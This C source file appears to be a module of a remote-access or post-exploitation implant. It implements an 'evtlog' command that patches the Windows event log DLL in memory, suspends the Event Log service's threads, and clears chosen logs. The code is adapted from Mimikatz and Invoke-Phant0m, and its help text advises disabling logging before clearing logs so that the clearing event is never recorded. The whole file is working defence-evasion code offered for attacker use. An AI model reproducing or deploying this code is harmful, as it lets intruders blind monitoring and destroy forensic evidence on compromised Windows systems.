#include <stdio.h>

#include "command.h"
#include "evtlog.h"
#include "networking.h"
#include "process.h"
#include "services.h"
#include "utils.h"

#include <psapi.h>
#include <winevt.h>

#pragma comment(lib, "wevtapi.lib")

// https://github.com/gentilkiwi/mimikatz/blob/110a831ebe7b529c5dd3010f9e7fced0d3e3a46c/mimikatz/modules/kuhl_m_event.c
static CONST BYTE bEvtlogSearchPattern[] = { 0x8b, 0xf1, 0x8b, 0x4d, 0x08, 0xe8 };
static CONST BYTE bEvtlogReplacePattern[] = { 0xc2, 0x04, 0x00 };
// For unpatching/reenabling event log.
static CONST BYTE bEvtlogOriginalPattern[] = { 0x6a, 0x10, 0xb8 };

// Returns 0 on success, else error.
static void PrintHelp(void) {
	NetSend(L"\t\t.:: EVTLOG HELP ::.\n\n"
			L"Usage: evtlog [help|enable|disable] | [clear [event log name to clear]]\n\n"
			L"\t%-12s:\tDisplay this menu.\n"
			L"\t%-12s:\tPatches the event logging service.\n"
			L"\t%-12s:\tUnpatches the event logging service.\n"
			L"\t%-12s:\tResumes the event logging service threads.\n"
			L"\t%-12s:\tSuspends the event logging service threads.\n"
			L"\t%-12s:\tClears event logs. Clears Security by default.\n\n"
			L"Examples:\n"
			L"\tevtlog clear Application\n"
			L"\tevtlog clear System\n\n"
			L"\tevtlog clear Microsoft-Windows-TerminalServices-LocalSessionManager/Operational\n\n"
			L"WARNINGS:\n"
			L"\t> Clearing event logs will generate an event log ID 1102! "
			L"Please disable the event logging service first!\n"
			L"\t> Clearing event logs should only be used when purging. Empty logs are suspicious.\n\n",
			OPTION_STRING_HELP,
			OPTION_STRING_PATCH,
			OPTION_STRING_UNPATCH,
			OPTION_STRING_RESUME,
			OPTION_STRING_SUSPEND,
			OPTION_STRING_CLEAR);
}

static void EvtlogNetSend(LPCWSTR fmt, ...) {
	WCHAR szBuf[NET_BUF_SIZE + 1];
	va_list args;

	ZeroMemory(szBuf, SIZEOF_ARRAY(szBuf));

	va_start(args, fmt);
	_vswprintf_p(szBuf, SIZEOF_ARRAY(szBuf) - sizeof(WCHAR), fmt, args);

	NetSend(L"%s: %s\n", EVTLOG_BANNER, szBuf);
}

// This section contains code to control the event log threads
// referenced from Invoke-Phant0m.
// https://artofpwn.com/phant0m-killing-windows-event-log.html
// Returns TRUE on success else, FALSE.
// No error handling is done in here.
static BOOL EvtlogIsEventLogThread(DWORD dwProcessId, DWORD dwThreadId) {
	BOOL bIsEventLogThread = FALSE;
	PVOID pTebAddress = 0;

	ULONG uError = ProcessThreadGetTeb(dwThreadId, &pTebAddress);
	if (uError == ERROR_SUCCESS) {
		if (pTebAddress != 0) {
			// Get a handle to the process so we can read its SubProcessTag.
			HANDLE hProcess = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_READ, FALSE, dwProcessId);
			if (hProcess != NULL) {
				// Get the SubProcessTag
				ULONG uSubProcessTag = 0;
				if (ProcessGetSubProcessTag(hProcess, pTebAddress, &uSubProcessTag) == ERROR_SUCCESS) {
					// Get the service name. Should be a service... right? :o
					SC_SERVICE_TAG_QUERY sstq;
					if (ProcessGetTagInformation(dwProcessId, uSubProcessTag, &sstq) == ERROR_SUCCESS) {
						// Okay, we got a name for the service. Let's compare it to the eventlog service name.
						if (!_wcsnicmp(sstq.Buffer, EVTLOG_SVC_NAME, wcslen(EVTLOG_SVC_NAME))) {
							// Okay, this is a thread we want to target.
							bIsEventLogThread = TRUE;
						}

						// Free the buffer!
						LocalFree(sstq.Buffer);
					}
				}
				CloseHandle(hProcess);
			}
		}
	}

	return bIsEventLogThread;
}

// Returns 0 on success else, the error code of GetLastError.
// dwNumThreads cannot be NULL.
// Since it's hard to predict the number of threads, it is recommended that dwThreadIds is
// initially sufficiently large enough to hold all potential threads. Use dwNumThreads to identify
// if the number of relevant threads that have been enumerated with your dwThreadIds
// array size.
static ULONG EvtlogGetEventLogThreads(HANDLE hProcess, LPDWORD dwThreadIds, DWORD dwSizeInBytes, LPDWORD dwNumThreads) {
	ULONG uError = ERROR_SUCCESS;
	// For each process, get its threads.
	DWORD dwThreads[1024], dwThreadNum = 0;
	ZeroMemory(dwThreads, sizeof(dwThreads));

	// Get all thread IDs.
	uError = ProcessGetThreadIds(GetProcessId(hProcess), dwThreads, sizeof(dwThreads), &dwThreadNum);
	if (uError == ERROR_SUCCESS) {
		// Enumerate thread list.
		for (DWORD j = 0; j < dwThreadNum; j++) {
			// For each thread, check if it contains an eventlog service.
			if (EvtlogIsEventLogThread(GetProcessId(hProcess), dwThreads[j]) == TRUE) {
				// Check if the dwThreadIds array has been exceeded.
				if (*dwNumThreads < dwSizeInBytes / sizeof(DWORD)) {
					// If it is an event log service thread, add it.
					dwThreadIds[*dwNumThreads] = dwThreads[j];
				}

				// Keep a counter on how many relevant threads have been enumerated.
				*dwNumThreads = *dwNumThreads + 1;
			}
		}
	}

	return ERROR_SUCCESS;
}

// Returns TRUE on success else, false.
// Suspends or resumes the event logging threads.
BOOL EvtLogActionThread(HANDLE hProcess, CONST BOOL bSuspend) {
	BOOL bSuccess = TRUE;
	DWORD dwThreads[1024], dwThreadNum = 0;
	ZeroMemory(dwThreads, sizeof(dwThreads));

	// Get the service process's event log threads.
	if (EvtlogGetEventLogThreads(hProcess, dwThreads, sizeof(dwThreads), &dwThreadNum) == ERROR_SUCCESS) {
		// Iterate through all threads.
		for (DWORD i = 0; i < dwThreadNum; i++) {
			// Open thread with resume and suspend access rights.
			HANDLE hThread = OpenThread(THREAD_SUSPEND_RESUME, FALSE, dwThreads[i]);
			if (hThread == NULL) {
				EvtlogNetSend(L"Failed to open handle to thread: <0x%08x>; error: %lu", dwThreads[i], GetLastError());
				continue;
			}

			// Apply action.
			if (bSuspend) {
				// Suspend thread.
				if (SuspendThread(hThread) == (DWORD)-1) {
					EvtlogNetSend(L"Failed to suspend thread <0x%08x>; error: %lu", dwThreads[i], GetLastError());
					bSuccess = FALSE;
				} else {
					EvtlogNetSend(L"Successfully suspended thread <0x%08x>.", dwThreads[i]);
				}
			} else {
				// Resume thread.
				if (ResumeThread(hThread) == (DWORD)-1) {
					EvtlogNetSend(L"Failed to resume thread <0x%08x>; error: %lu", dwThreads[i], GetLastError());
					bSuccess = FALSE;
				} else {
					EvtlogNetSend(L"Successfully resumed thread <0x%08x>.", dwThreads[i]);
				}
			}

			CloseHandle(hThread);
		}
	}

	return bSuccess;
}

// Returns TRUE on success else, false.
// Patches or unpatches the event logging module (wevtsvc.dll)
BOOL EvtLogActionPatch(HANDLE hProcess, CONST BOOL bPatch) {
	// Get the base address of wevtsvc.dll
	HMODULE hModule = NULL;
	ULONG uError = ProcessGetSystemModuleBase(hProcess, L"wevtsvc.dll", &hModule);
	if (uError != ERROR_SUCCESS) {
		EvtlogNetSend(L"Failed to get event log module address; error: %lu", uError);
		return FALSE;
	}

	// TODO Move to process.c?
	// Get the module information.
	MODULEINFO mi;
	ZeroMemory(&mi, sizeof(mi));

	if (GetModuleInformation(hProcess, hModule, &mi, sizeof(mi)) == FALSE) {
		EvtlogNetSend(L"Failed to get module information; error: %lu", GetLastError());
		return FALSE;
	}

	// Search the module for pattern and replace it.
	BOOL bIsPatched = FALSE;
	if (bPatch) {
		uError = ProcessPatchMemoryPattern(hProcess, (DWORD_PTR)mi.lpBaseOfDll, (DWORD_PTR)((DWORD_PTR)mi.lpBaseOfDll + mi.SizeOfImage), -12, bEvtlogSearchPattern, sizeof(bEvtlogSearchPattern), bEvtlogReplacePattern, sizeof(bEvtlogReplacePattern), &bIsPatched);
		if (uError != ERROR_SUCCESS) {
			EvtlogNetSend(L"Failed to search memory pattern; error: %lu", uError);
			return FALSE;
		}
	} else {
		// Invert patch disable
		uError = ProcessPatchMemoryPattern(hProcess, (DWORD_PTR)mi.lpBaseOfDll, (DWORD_PTR)((DWORD_PTR)mi.lpBaseOfDll + mi.SizeOfImage), -12, bEvtlogSearchPattern, sizeof(bEvtlogSearchPattern), bEvtlogOriginalPattern, sizeof(bEvtlogOriginalPattern), &bIsPatched);
		if (uError != ERROR_SUCCESS) {
			EvtlogNetSend(L"Failed to search memory pattern; error: %lu", uError);
			return FALSE;
		}
	}

	return TRUE;
}

// Returns TRUE on success else, false.
// This should only be used when purging.
// It is suspicious if there are no logs.
BOOL EvtlogClear(LPCWSTR szEventLogName) {
	return EvtClearLog(NULL, szEventLogName ? szEventLogName : L"Security", NULL, 0);
}

// Returns TRUE on success else, false.
BOOL EvtlogAction(CONST EVTLOG_ACTION eAction) {
	SERVICE_STATUS_PROCESS ssp;
	ZeroMemory(&ssp, sizeof(ssp));

	// Get the event log service process ID.
	ULONG uError = ServicesGetServiceStatus(EVTLOG_SVC_NAME, &ssp);
	if (uError != ERROR_SUCCESS) {
		EvtlogNetSend(L"Failed to get event log service status; error: %lu", uError);
		return FALSE;
	}

	// Check if the process is running first.
	if (ssp.dwCurrentState < SERVICE_RUNNING) {
		EvtlogNetSend(L"The event log service is not active!");
		return FALSE;
	}

	// Open the process.
	HANDLE hProcess = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_QUERY_INFORMATION, FALSE, ssp.dwProcessId);
	if (hProcess == NULL) {
		EvtlogNetSend(L"Failed to open the event log service's process; error: %lu", GetLastError());
		return FALSE;
	}

	BOOL bSuccess = FALSE;
	if (eAction == EVTLOG_SUSPEND || eAction == EVTLOG_RESUME) {
		bSuccess = EvtLogActionThread(hProcess, eAction == EVTLOG_SUSPEND ? TRUE : FALSE);
	} else {
		bSuccess = EvtLogActionPatch(hProcess, eAction == EVTLOG_PATCH ? TRUE : FALSE);
	}

	CloseHandle(hProcess);

	return bSuccess;
}

ULONG EvtlogMain(INT argc, LPWSTR *argv) {
	if (argc < 2) {
		PrintHelp();
	} else {
		if (!_wcsnicmp(argv[1], OPTION_STRING_HELP, wcslen(OPTION_STRING_HELP))) {
			PrintHelp();
		} else if (!_wcsnicmp(argv[1], OPTION_STRING_PATCH, wcslen(OPTION_STRING_PATCH))) {
			if (EvtlogAction(EVTLOG_PATCH) == TRUE) {
				EvtlogNetSend(L"Event logging has been patched.");
			}
		} else if (!_wcsnicmp(argv[1], OPTION_STRING_UNPATCH, wcslen(OPTION_STRING_UNPATCH))) {
			if (EvtlogAction(EVTLOG_UNPATCH) == TRUE) {
				EvtlogNetSend(L"Event logging has been unpatched.");
			}
		} else if (!_wcsnicmp(argv[1], OPTION_STRING_RESUME, wcslen(OPTION_STRING_RESUME))) {
			if (EvtlogAction(EVTLOG_RESUME) == TRUE) {
				EvtlogNetSend(L"Event logging has been resumed.");
			}
		} else if (!_wcsnicmp(argv[1], OPTION_STRING_SUSPEND, wcslen(OPTION_STRING_SUSPEND))) {
			if (EvtlogAction(EVTLOG_SUSPEND) == TRUE) {
				EvtlogNetSend(L"Event logging has been suspended.");
			}
		} else if (!_wcsnicmp(argv[1], OPTION_STRING_CLEAR, wcslen(OPTION_STRING_CLEAR))) {
			if (argc < 3) {
				if (EvtlogClear(NULL) == TRUE) {
					EvtlogNetSend(L"Event log (security) has been cleared.");
				}
			} else {
				if (EvtlogClear(argv[2]) == TRUE) {
					EvtlogNetSend(L"Event log (%s) has been cleared.", argv[2]);
				}
			}
		} else {
			EvtlogNetSend(L"Bad arguments.");
		}
	}

	return 0;
}
